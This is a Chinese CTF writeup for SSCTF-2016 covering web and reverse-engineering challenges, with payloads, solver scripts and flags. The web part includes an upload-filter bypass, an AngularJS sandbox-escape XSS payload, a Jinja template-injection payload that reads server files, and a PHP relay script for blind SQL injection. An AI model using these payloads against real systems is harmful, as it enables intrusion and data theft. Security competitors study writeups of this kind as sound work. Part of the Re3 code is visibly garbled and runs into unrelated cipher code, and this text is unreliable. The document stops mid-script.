# FlappyPig SSCTF-2016 Writeup
|
##### 译文声明
本文是翻译文章，文章来源：360安全播报
译文仅供参考，具体内容表达以及含义原文为准。
****
**FlappyPig SSCTF-2016 Writeup**
**Web**
**100 Up!Up!Up!**
这道题比较坑啊… 后来还看chu总在微博上吐槽：上传过滤还能这么写啊..
其实这道题是从逐浪CMS一个漏洞演化来的，翻了好久的乌云.. 最终找到了
[http://www.wooyun.org/bugs/wooyun-2015-0125982](http://www.wooyun.org/bugs/wooyun-2015-0125982)
只要将multipart/form-data的大小写改下就可以上传php文件了
Flag：SSCTF{d750aa9eb742bde8c65bc525f596623a}
**  
**
**200 Can You Hit Me？**
队友说这是Augularjs.. 然后去补习了下
google发现了一遍博文，里面带有一些payload
[http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html](http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html)
通过文章里提供的payload构造自己的payload
xss={{%27a%27.coonnstructor.prototype.charAt=[].join;$evevalal(%22m=1)%20}%20};alalertert(123)//%22};}}
成功弹窗，最好把payload发给主办方就可以得到Flag
SSCTF{4c138226180306f21ceb7e7ed1158f08}
**  
**
**300 Legend？Legend！**
这道题通过尝试注入报错判断是SQL注入，但是用尽了姿势都没有搞定，于是猜想是不是什么高逼格的数据库.. 果然，是一个MongoDB
http://drops.wooyun.org/tips/3939
根据文章构造payload，读取user表中的第一条。
尝试提交MD5..不对 然后登陆邮箱 发现了一个假的flag..
还有神奇的xss
最后终于找到了正确的flag
**  
**
**400 Flag-Man**
登录github授权，然后发现在Your Profile中的Name是控制/users中的name
Name是可控制的,遍历目录 最后读取文件 得到flag
参见[http://drops.wooyun.org/web/13057](https://mail.qq.com/cgi-bin/mail_spam?action=check_link&spam=0&spam_src=1&mailid=ZC0429-wnFNyJpt0_YlZ2g~GkPKD62&url=http%3A%2F%2Fdrops%2Ewooyun%2Eorg%2Fweb%2F13057)
payload:
    {%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__ == 'catch_warnings'%}{{c.__init__.func_globals['linecache'].__dict__['__builtins__'].open('ssctf.py').read()}}{%endif%}{%endfor%}
更改完之后 访问user目录 得到flag
**500 AFSRC-Market**
这道题一直没思路.. 凌晨一点多的时候突然放了提示
（让不让人睡觉了啊！摔）
注入在add_cart.php页面，提交id=xxx cost为0 判断有注入，但是不能直接得到数据。于是中转注入
     $opts = array ('http' => array ('header'=>'Cookie: PHPSESSID=1;'));
    $context = stream_context_create($opts);
    $html = file_get_contents('http://edb24e7c.seclover.com/add_cart.php?id=0x'.bin2hex($_GET[x]), false, $context);
    $html = file_get_contents('http://edb24e7c.seclover.com/userinfo.php', false, $context);
    preg_match('/cost: (.*?)/is',$html,$res);
    echo $res[1]==0 ? 0 : 1;
注出来一个提示页面
根据提示注自己的token 然后爆破salt 按步骤走最终得到Flag
**Reverse**
**100 Re1**
这个题一开始想难了。Apk拖入jeb，主类是Seclreg，初始化函数如下，主要是加了两个监听
重点看sign_btn的监听函数，如下这一行做了一个des加密，加密数据为secl-007，注意c后面是l不是1.；密钥是A7B7C7D7E7F70717进行了一些变换，加密结果暂时不管。
重点的判断语句在下图的这行，用户名需要是secl-007，密码和上述加密结果传入lib进行进一步判断。
Ida打开libplokm.so，定位到getp函数，本函数第一个参数是加密后的结果，第二个参数是输入的密码。大概浏览了一眼，函数没有对密码做任何修改，定位到最后的比较语句，如下图，发现密码需要有39位。
此时直接gdb挂上，查看该调用传入的第一个参数就是flag（其实是两遍flag）。
**  
**
**200 Re2**
这个程序主要是建立了多个线程，所有的变换都是在线程中进行的。由比较的地方一点点往前逆推。
比较坑的地方如下，8个字节变成1个字节，信息缺失这么多。解应该很多。
写了个脚本算了几组可能的解，刚好flag就在里面。
    def BIN(s):
        return ''.join([format(ord(x),'08b') for x in str(s)])
    key = 'c678d6g64307gf4g`b263473ge35b5`9'
    #a2b3dcab | aabbd4a3 | b2a3ccbb | baabc4b3
    valuess = ['a2b3dcab' , 'aabbd4a3' , 'b2a3ccbb' , 'baabc4b3']
    for value in valuess:
        value = value.decode('hex')
        s2 = BIN(value)
        #print s2
        res = ''
        for i in range(32):
            if s2[i] == '1':
                res += chr(ord(key[i])^1)
            else:
                res += key[i]
    print res
**300 Re3**
上来逆向发现
atoi(input)=2453148193
md5(input)=4850B7446BBB20AAD140E7B0A964A57D
难道要暴力跑？
后来，查看了下资源，发现有两个按钮，修改0x40162d处指令为push 1，运行可以看到。
具体算法比较简单，写了个代码解了下。
    res = "b5h760h64R867618bBwB48BrW92H4w5r"
    ddd = 'chmrwbglqvafkpuzejotydinsx'
    dicts = {}
    for i in range(26):
        dicts[ddd[i]]=(ord('a')+i)
        #dicts[chr((ord('a')+i))]=ord(ddd[i])
    res2 = ''
    for i in range(32):
        c = ord(res[i])
        if (c >= 0x30)&(c=ord('a'))&(c=ord('A'))&(c> (8 - k))) & 0xff
       def encode(p):
         ret = ""
         for i in range(8):
             ret = ('|' if (p >> i) & 1 else 'O') + ret
         return ret
     plaintemp = bytearray("asdfghjk123456")
       def calc(key,plain=plaintemp):
         A = [85, 128, 177, 163, 7, 242, 231, 69, 185, 1, 91, 89, 80, 156, 81, 9, 102, 221, 195, 33, 31, 131, 179, 246, 15, 139, 205, 49, 107, 193, 5, 63, 117, 74, 140, 29, 135, 43, 197, 212, 0, 189, 218, 190, 112, 83, 238, 47, 194, 68, 233, 67, 122, 138, 53, 14, 35, 76, 79, 162, 145, 51, 90, 234, 50, 6, 225, 250, 215, 133, 180, 97, 141, 96, 20, 226, 3, 191, 187, 57, 168, 171, 105, 113, 196, 71, 239, 200, 254, 175, 164, 203, 61, 16, 241, 40, 176, 59, 70, 169, 146, 247, 232, 152, 165, 62, 253, 166, 167, 182, 160, 125, 78, 28, 130, 159, 255, 124, 153, 56, 58, 143, 150, 111, 207, 206, 32, 144,
              75, 39, 10, 201, 204, 77, 104, 65, 219, 98, 210, 173, 249, 13, 12, 103, 101, 21, 115, 48, 157, 147, 11, 99, 227, 45, 202, 158, 213, 100, 244, 54, 17, 161, 123, 92, 181, 243, 184, 188, 84, 95, 27, 72, 106, 192, 52, 44, 55, 129, 208, 109, 26, 24, 223, 64, 114, 19, 198, 23, 82, 120, 142, 178, 214, 186, 116, 94, 222, 86, 251, 36, 4, 248, 132, 25, 211, 199, 30, 87, 60, 127, 155, 41, 224, 151, 237, 136, 245, 37, 170, 252, 8, 42, 209, 46, 108, 88, 183, 149, 110, 66, 235, 229, 134, 73, 38, 118, 236, 119, 154, 216, 217, 240, 22, 121, 174, 93, 126, 230, 228, 18, 148, 220, 172, 2, 137, 34]
         B = [0, 2, 3, 7, 1, 5, 6, 4]
         C = [179, 132, 74, 60, 94, 252, 166, 242, 208, 217, 117, 255, 20, 99, 225, 58, 54, 184, 243, 37, 96, 106, 64, 151, 148, 248, 44, 175, 152, 40, 171, 251, 210, 118, 56, 6, 138, 77, 45, 169, 209, 232, 68, 182, 91, 203, 9, 16, 172, 95, 154, 90, 164, 161, 231, 11, 21, 3, 97, 70, 34, 86, 124, 114, 119, 223, 123, 167, 47, 219, 197, 221, 193, 192, 126, 78, 39, 233, 4, 120, 33, 131, 145, 183, 143, 31, 76, 121, 92, 153, 85, 100, 52, 109, 159, 112, 71, 62, 8, 244, 116, 245, 240, 215, 111, 134, 199, 214, 196, 213, 180, 189, 224, 101, 202, 201, 168, 32, 250, 59, 43, 27, 198, 239, 137, 238, 50,
              149, 107, 247, 7, 220, 246, 204, 127, 83, 146, 147, 48, 17, 67, 23, 93, 115, 41, 191, 2, 227, 87, 173, 108, 82, 205, 49, 1, 66, 105, 176, 22, 236, 29, 170, 110, 18, 28, 185, 235, 61, 88, 13, 165, 188, 177, 230, 130, 253, 150, 211, 42, 129, 125, 141, 19, 190, 133, 53, 84, 140, 135, 10, 241, 222, 73, 12, 155, 57, 237, 181, 36, 72, 174, 207, 98, 5, 229, 254, 156, 178, 128, 55, 14, 69, 30, 194, 122, 46, 136, 160, 206, 26, 102, 218, 103, 139, 195, 0, 144, 186, 249, 79, 81, 75, 212, 234, 158, 163, 80, 226, 65, 200, 38, 187, 113, 63, 24, 25, 142, 51, 228, 35, 157, 216, 104, 162, 15, 89]
         D = [2, 4, 0, 5, 6, 7, 1, 3]
         assert len(key) == 8
         t1 = bytearray()
         for i in plain:
             t1.append(A[i])
         t2 = bytearray()
         for i in range(len(t1)):
             t2.append(LShift(t1[i], B[i % 8]))
         for times in range(16):
             for i in range(len(t2)):
                 t2[i] = C[t2[i]]
             for i in range(len(t2)):
                 t2[i] = LShift(t2[i], i ^ D[i % 8])
             for i in range(len(t2)):
                 t2[i] ^= key[i % 8]
         out = ""
         for i in t2:
             out += encode(i)
         return out
     out='OO|OO||OO|||||OO|OO||O||O|O||O|||O|OOOOOOO|O|O|O|||||OO|||O|||OO||O|OOOOOO|O|OO|OO||||OO|||OOOO|||||O||||O|OO|O|O|O||OO|O||O|OO|O||O|||O||O|OO|OOOOOO||OOO|O|O|O|||O|OO|O|O||O||O||OOOOO|||OO|O|'
       flagout="OO||O||O|O|||OOOO||||||O|O|||OOO||O|OOOO||O|O|OO|||||OOOO||||O||OO|OO||O||O|O|O|||||OOOOOO|O|O||OOOOOOO||O|||OOOO||OO|OO|||O|OO|O|||O|O|OO|OOOO|OOO|OOO|OOOO||O|OO||||OO||||OOO|O|O||OO||||O||OOO|||O|OO|OO||OO||OOOO|O|"
       j=0
       while j<14*8-8:
         for i in range(0xff):
             if calc([i,i,i,i,i,i,i,i])[j:j+8]==out[j:j+8]:
                 print i,
         print "=="
         j+=8
       kp2=[57,84,153,163]
     kp3=[51,245]
     kp4=[0,4,95,157,163]
     keylist=[]
       for i1 in kp2:
         for i2 in kp3:
             for i3 in kp4:
                 temp=[94,38,35,113,68]
                 temp.append(i1)
                 temp.append(i2)
                 temp.append(i3)
                 keylist.append(temp)
       print keylist
       for key in keylist:
         fte=[]
         for ci in range(32):